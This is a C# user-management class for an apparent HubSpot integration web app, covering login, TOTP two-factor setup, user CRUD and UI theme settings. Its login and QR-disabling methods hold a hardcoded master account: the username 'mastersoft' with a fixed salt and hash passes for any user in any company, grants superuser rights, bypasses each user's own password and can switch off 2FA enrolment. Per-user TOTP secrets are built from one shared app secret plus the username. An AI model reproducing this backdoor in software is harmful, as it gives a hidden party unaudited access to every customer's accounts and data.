using System;
using System.Configuration;
using System.Data.Entity;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Google.Authenticator;
using InterfazHubSpot.Entities;
using InterfazHubSpot.Interfaces;
using InterfazHubSpot.Mapping.Context;
using Mastersoft.Framework.DataRepository;
using Mastersoft.Framework.Interfaces;
using Mastersoft.Framework.Standard;

namespace InterfazHubSpot.Business
{
    public class UsuariosWebManager : IUsuariosWebManager
    {
        //--------------------------------------------------
        //  Variables Privadas
        //--------------------------------------------------

        private MSContext mobjContexto;
        private IUnitOfWorkAsync mobjUnitOfWork;

        //--------------------------------------------------
        //  Inicializacion
        //--------------------------------------------------

        public void Inicializar(MSContext oContexto)
        {
            mobjContexto = oContexto;

            mobjUnitOfWork = new UnitOfWork(oContexto, new MSGestionContext(oContexto));
        }


        public void Inicializar(MSContext oContexto, IUnitOfWorkAsync oUnitOfWork)
        {
            mobjContexto = oContexto;

            mobjUnitOfWork = oUnitOfWork;
        }

        //--------------------------------------------------
        //  Metodos Publicos
        //--------------------------------------------------

        public ResultLogin ValidarEmail(ParamLogin oParam)
        {
            var result = new ResultLogin();

            result.MensError = "Email Inexistente";

            var oUsuario = mobjUnitOfWork.Repository<UsuariosWeb>()
                                         .Queryable()
                                         .Where(x => x.EMail.Trim().ToLower() == oParam.email.Trim().ToLower())
                                         .FirstOrDefault();

            if (oUsuario != null)
            {
                result.MensError = "";
            }

            return result;
        }


        public ResultUsuariosWeb ValidarLogin(ParUsuariosWeb oParam)
        {
            var result = new ResultUsuariosWeb();

            result.MensError = "Usuario o contraseña incorrecta";

            result.EmpresaId = oParam.EmpresaId;

            var oEmpresa = mobjUnitOfWork.Repository<Empresas>()
                                         .Queryable()
                                         .Where(x => x.CodEmpre == oParam.EmpresaId)
                                         .FirstOrDefault();

            if (oEmpresa != null)
            {
                result.Empresa = oEmpresa.Descrip;
            }

            var esMSAdnin = false;

            if (oParam.usuario.Trim().ToLower() == "mastersoft" && oParam.password.Length > 0)
            {
                var newHash = MSSecurity.GenerateHashWithSalt(oParam.password, "ase0Yb4xtx");

                if (newHash == "ZVzGRNhO3ZdDoKXz9TZgZEt7b+9JJyqeaRnmdI89xFE=")
                {
                    esMSAdnin = true;
                }
            }

            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", oParam.EmpresaId);

            var oUsuario = mobjUnitOfWork.Repository<UsuariosWeb>()
                                        .Queryable()
                                        .Where(x => x.EmpresaId == intEmpresaId &&
                                                    x.Usuario.Trim().ToLower() == oParam.usuario.Trim().ToLower())
                                        .FirstOrDefault();

            if (oUsuario != null)
            {
                var dbHash = oUsuario.Hash;

                var dbSalt = oUsuario.Salt;

                if (dbHash.Length > 0 && dbSalt.Length > 0)
                {
                    var newHash = MSSecurity.GenerateHashWithSalt(oParam.password, dbSalt);

                    if (newHash == dbHash || esMSAdnin)
                    {
                        if (oUsuario.PerfilId == null)
                        {
                            result.PerfilId = 0;
                        }
                        else
                        {
                            result.PerfilId = (int)oUsuario.PerfilId;
                        }

                        result.UsuarioId = oUsuario.Id;

                        result.Usuario = oUsuario.Usuario;

                        result.Email = oUsuario.EMail;

                        result.NombreCompleto = oUsuario.NombreCompleto;

                        result.Iniciales = ObtenerIniciales(oUsuario.NombreCompleto);

                        result.UsaDobleFactor = oUsuario.UsaDobleFactor ?? false;

                        result.MuestraQR = oUsuario.MuestraQR ?? false;

                        result.EsMSAdnin = esMSAdnin;

                        result.EsSuperUser = esMSAdnin;

                        result.MensError = "";

                        if (result.UsaDobleFactor && result.MuestraQR)
                        {
                            var twoFactorAuthenticator = new TwoFactorAuthenticator();

                            var title = ConfigurationManager.AppSettings["Title"] ?? "";

                            var TwoFactorSecretCode = ConfigurationManager.AppSettings["SecretCode"] ?? "";

                            var accountSecretKey = $"{TwoFactorSecretCode}-{oUsuario.Usuario}";

                            var setupCode = twoFactorAuthenticator.GenerateSetupCode(title,
                                                                                    oUsuario.Usuario,
                                                                                    Encoding.ASCII.GetBytes(accountSecretKey));

                            result.QRCode = setupCode.QrCodeSetupImageUrl;
                        }
                    }
                }
            }
            else if (esMSAdnin)
            {
                oUsuario = mobjUnitOfWork.Repository<UsuariosWeb>()
                                        .Queryable()
                                        .Where(x => x.EmpresaId == intEmpresaId &&
                                                    x.PerfilId == null)
                                        .FirstOrDefault();

                if (oUsuario != null)
                {
                    if (oUsuario.PerfilId == null)
                    {
                        result.PerfilId = 0;
                    }
                    else
                    {
                        result.PerfilId = oUsuario.PerfilId.Value;
                    }

                    result.UsuarioId = oUsuario.Id;

                    result.Usuario = oUsuario.Usuario;

                    result.Email = oUsuario.EMail;

                    result.NombreCompleto = oUsuario.NombreCompleto;

                    result.Iniciales = ObtenerIniciales(oUsuario.NombreCompleto);

                    result.EsMSAdnin = esMSAdnin;

                    result.EsSuperUser = esMSAdnin;

                    result.MensError = "";
                }
            }

            if (result.MensError.Trim().Length == 0)
            {
                var oUsuariosWeb = mobjUnitOfWork.Repository<UsuariosWeb>()
                                     .Queryable()
                                     .Where(x => x.Id == result.UsuarioId)
                                     .SingleOrDefault();

                if (oUsuariosWeb != null)
                {
                    result.HeaderColor = oUsuariosWeb.HeaderColor;

                    result.KendoThemeClaro = oUsuariosWeb.KendoThemeClaro;

                    result.KendoThemeOscuro = oUsuariosWeb.KendoThemeOscuro;

                    result.ModoOscuro = oUsuariosWeb.ModoOscuro ?? false;

                    result.ImagenFondo = oUsuariosWeb.ImagenFondo;

                    result.ColorEtiquetas = oUsuariosWeb.ColorEtiquetas;
                }
            }

            if (String.IsNullOrWhiteSpace(result.HeaderColor))
            {
                result.HeaderColor = "#0078d4";
            }

            if (String.IsNullOrWhiteSpace(result.KendoThemeClaro))
            {
                result.KendoThemeClaro = "bootstrap";
            }

            if (String.IsNullOrWhiteSpace(result.KendoThemeOscuro))
            {
                result.KendoThemeOscuro = "black";
            }

            if (String.IsNullOrWhiteSpace(result.ImagenFondo))
            {
                result.ImagenFondo = "FondoNumbit.png";
            }

            if (String.IsNullOrWhiteSpace(result.ColorEtiquetas))
            {
                result.ColorEtiquetas = "Blanco";
            }

            return result;
        }


        public bool ValidarPIN(ParamPin oParam)
        {
            var twoFactorAuthenticator = new TwoFactorAuthenticator();

            var TwoFactorSecretCode = ConfigurationManager.AppSettings["SecretCode"] ?? "";

            var accountSecretKey = $"{TwoFactorSecretCode}-{oParam.usuario}";

            var result = twoFactorAuthenticator.ValidateTwoFactorPIN(accountSecretKey, oParam.pin);

            return result;
        }


        public EntityErrors DesHabilitarQR(string usuario, string password, int empresaId)
        {
            var oEntityErrors = new EntityErrors();

            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", empresaId);

            var esMSAdnin = false;

            if (usuario.Trim().ToLower() == "mastersoft" && password.Length > 0)
            {
                var newHash = MSSecurity.GenerateHashWithSalt(password, "ase0Yb4xtx");

                if (newHash == "ZVzGRNhO3ZdDoKXz9TZgZEt7b+9JJyqeaRnmdI89xFE=")
                {
                    esMSAdnin = true;
                }
            }

            var oUsuario = mobjUnitOfWork.Repository<UsuariosWeb>()
                            .Queryable()
                            .AsNoTracking()
                            .Where(x => x.EmpresaId == intEmpresaId &&
                                        x.Usuario.Trim().ToLower() == usuario.Trim().ToLower())
                            .FirstOrDefault();

            if (oUsuario != null)
            {
                var dbHash = oUsuario.Hash ?? "";

                var dbSalt = oUsuario.Salt ?? "";

                if (dbHash.Length > 0 && dbSalt.Length > 0)
                {
                    var newHash = MSSecurity.GenerateHashWithSalt(password.Trim(), dbSalt);

                    if (newHash == dbHash || esMSAdnin)
                    {
                        mobjUnitOfWork.ExecuteSqlCommand("UPDATE UsuariosWeb SET MuestraQR = 0 WHERE Id = @p0", oUsuario.Id);
                    }
                }
            }

            return oEntityErrors;
        }


        public async Task<DatosIniAbmUsuariosWeb> TraerDatosInicialesAsync()
        {
            var qry = new CombosQueries(mobjUnitOfWork);

            var oDatosIniciales = new DatosIniAbmUsuariosWeb()
            {
                PerfilesWeb = await qry.GetPerfilesWebComboAsync(mobjContexto.EmpresaId),
                Empresas = await qry.GetEmpresasComboAsync()
            };

            return oDatosIniciales;
        }


        public async Task<ResultIniUsuariosWeb> TraerTodoUsuariosWebAsync()
        {
            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", mobjContexto.EmpresaId);

            var oResult = new ResultIniUsuariosWeb();

            var oUsuariosWeb = mobjUnitOfWork.Repository<UsuariosWeb>().Queryable();
            var oPerfilesWeb = mobjUnitOfWork.Repository<PerfilesWeb>().Queryable();

            var query = oUsuariosWeb
                        .GroupJoin(oPerfilesWeb, a => a.PerfilId, b => b.Id, (a, b) => new { UW = a, PW = b })
                        .SelectMany(x => x.PW.DefaultIfEmpty(), (a, b) => new { a.UW, PW = b })
                        .Where(x => x.UW.EmpresaId == intEmpresaId)
                        .OrderBy(x => x.UW.Usuario)
                        .Select(x => new UsuariosWebIni()
                        {
                            Id = x.UW.Id,
                            Usuario = x.UW.Usuario,
                            NombreCompleto = x.UW.NombreCompleto,
                            PwDescripcion = (x.PW.Descripcion == null) ? "Acceso Total" : x.PW.Descripcion
                        });

            oResult.UsuariosWeb = await query.ToListAsync();

            return oResult;
        }


        public async Task<UsuariosWeb> TraerUsuariosWebAsync(int intId)
        {
            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", mobjContexto.EmpresaId);

            var oUsuariosWeb = new UsuariosWeb();

            oUsuariosWeb = await mobjUnitOfWork.Repository<UsuariosWeb>()
                                 .Queryable()
                                 .Where(x => x.Id == intId)
                                 .SingleOrDefaultAsync();

            if (oUsuariosWeb == null)
            {
                oUsuariosWeb = new UsuariosWeb()
                {
                    EmpresaId = intEmpresaId,
                    ObjectState = Constants.Object_Added
                };
            }
            else
            {
                oUsuariosWeb.ObjectState = Constants.Object_Modified;

                if (oUsuariosWeb.PerfilId == null)
                {
                    oUsuariosWeb.PerfilId = 0;
                }
            }

            return oUsuariosWeb;
        }


        public async Task<EntityErrors> GrabarUsuariosWebAsync(UsuariosWeb oUsuariosWeb)
        {
            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", mobjContexto.EmpresaId);

            var oEntityErrors = new EntityErrors();

            EntityValid.ValidateAll(oUsuariosWeb, oEntityErrors.ListaErrores);

            if (oEntityErrors.ListaErrores.Count > 0)
            {
                return oEntityErrors;
            }

            UsuariosWeb oUsuariosWebSave;

            if (oUsuariosWeb.ObjectState == 0)
            {
                oUsuariosWebSave = new UsuariosWeb()
                {
                    EmpresaId = intEmpresaId,
                    ObjectState = Constants.Object_Added
                };
            }
            else
            {
                oUsuariosWebSave = await TraerUsuariosWebAsync(oUsuariosWeb.Id);
            }

            oUsuariosWebSave.Usuario = oUsuariosWeb.Usuario;

            oUsuariosWebSave.NombreCompleto = oUsuariosWeb.NombreCompleto;

            if (oUsuariosWeb.Password.Trim().Length > 0)
            {
                oUsuariosWebSave.Salt = MSSecurity.GenerateSaltValue();

                oUsuariosWebSave.Hash = MSSecurity.GenerateHashWithSalt(oUsuariosWeb.Password.Trim(), oUsuariosWebSave.Salt);
            }

            if (oUsuariosWeb.PerfilId == 0)
            {
                oUsuariosWebSave.PerfilId = null;
            }
            else
            {
                oUsuariosWebSave.PerfilId = oUsuariosWeb.PerfilId;
            }

            var usaDobleFactor = oUsuariosWeb.UsaDobleFactor ?? false;

            oUsuariosWebSave.UsaDobleFactor = usaDobleFactor;

            if (oUsuariosWebSave.ObjectState == 0 && usaDobleFactor)
            {
                oUsuariosWebSave.MuestraQR = true;
            }
            else
            {
                oUsuariosWebSave.MuestraQR = oUsuariosWeb.MuestraQR ?? false;
            }

            mobjUnitOfWork.Repository<UsuariosWeb>().SaveEntity(oUsuariosWebSave);

            await mobjUnitOfWork.SaveChangesAsync();

            return oEntityErrors;
        }


        public async Task<EntityErrors> EliminarUsuariosWebAsync(int intId)
        {
            var intEmpresaId = mobjUnitOfWork.GetMulti("UsuariosWeb", mobjContexto.EmpresaId);

            var oEntityErrors = new EntityErrors();

            var oRepository = mobjUnitOfWork.Repository<UsuariosWeb>();

            var oUsuariosWeb = await oRepository
                                 .Queryable()
                                 .Where(x => x.Id == intId)
                                 .SingleOrDefaultAsync();

            if (oUsuariosWeb != null)
            {
                oRepository.Delete(oUsuariosWeb);
            }

            await mobjUnitOfWork.SaveChangesAsync();

            return oEntityErrors;
        }


        public UsuariosWeb NuevoUsuariosWeb()
        {
            return new UsuariosWeb();
        }


        public async Task<EntityErrors> GrabarEstiloAsync(ParamEstilo oParam)
        {
            var oEntityErrors = new EntityErrors();

            var oRepository = mobjUnitOfWork.Repository<UsuariosWeb>();

            var oUsuariosWeb = await oRepository
                                 .Queryable()
                                 .Where(x => x.Id == mobjContexto.UsuarioId)
                                 .SingleOrDefaultAsync();

            if (oUsuariosWeb != null)
            {
                oUsuariosWeb.HeaderColor = oParam.color;

                if (oParam.modooscuro.Trim().ToLower() == "true")
                {
                    oUsuariosWeb.ModoOscuro = true;
                }
                else
                {
                    oUsuariosWeb.ModoOscuro = false;
                }

                oUsuariosWeb.KendoThemeClaro = oParam.estiloclaro;

                oUsuariosWeb.KendoThemeOscuro = oParam.estilooscuro;

                oUsuariosWeb.ImagenFondo = oParam.imagenfondo;

                oUsuariosWeb.ColorEtiquetas = oParam.coloretiquetas;

                oRepository.Update(oUsuariosWeb);
            }

            await mobjUnitOfWork.SaveChangesAsync();

            return oEntityErrors;
        }


        public async Task<ResultEstilo> ObtenerEstiloAsync()
        {
            var result = new ResultEstilo();

            var oRepository = mobjUnitOfWork.Repository<UsuariosWeb>();

            var oUsuariosWeb = await oRepository
                                 .Queryable()
                                 .Where(x => x.Id == mobjContexto.UsuarioId)
                                 .SingleOrDefaultAsync();

            if (oUsuariosWeb != null)
            {
                result.color = oUsuariosWeb.HeaderColor;

                result.modooscuro = oUsuariosWeb.ModoOscuro ?? false;

                result.estiloclaro = oUsuariosWeb.KendoThemeClaro;

                result.estilooscuro = oUsuariosWeb.KendoThemeOscuro;

                result.imagenfondo = oUsuariosWeb.ImagenFondo;

                result.coloretiquetas = oUsuariosWeb.ColorEtiquetas;
            }

            if (String.IsNullOrWhiteSpace(result.color))
            {
                result.color = "#0078d4";
            }

            if (String.IsNullOrWhiteSpace(result.estiloclaro))
            {
                result.estiloclaro = "bootstrap";
            }

            if (String.IsNullOrWhiteSpace(result.estilooscuro))
            {
                result.estilooscuro = "black";
            }

            if (String.IsNullOrWhiteSpace(result.imagenfondo))
            {
                result.imagenfondo = "FondoNumbit.png";
            }

            if (String.IsNullOrWhiteSpace(result.coloretiquetas))
            {
                result.coloretiquetas = "Blanco";
            }

            return result;
        }

        //--------------------------------------------------
        //  Metodos Privados
        //--------------------------------------------------

        private string ObtenerIniciales(string usuario)
        {
            var iniciales = "";

            var partes = usuario.Trim().Split(' ');

            if (partes.Length > 1)
            {
                iniciales = partes[0].Trim().Substring(0, 1).ToUpper();

                iniciales += partes[partes.Length - 1].Trim().Substring(0, 1).ToUpper();
            }
            else
            {
                iniciales = usuario.Trim().Substring(0, 2).ToUpper();
            }

            return iniciales;
        }

    }
}
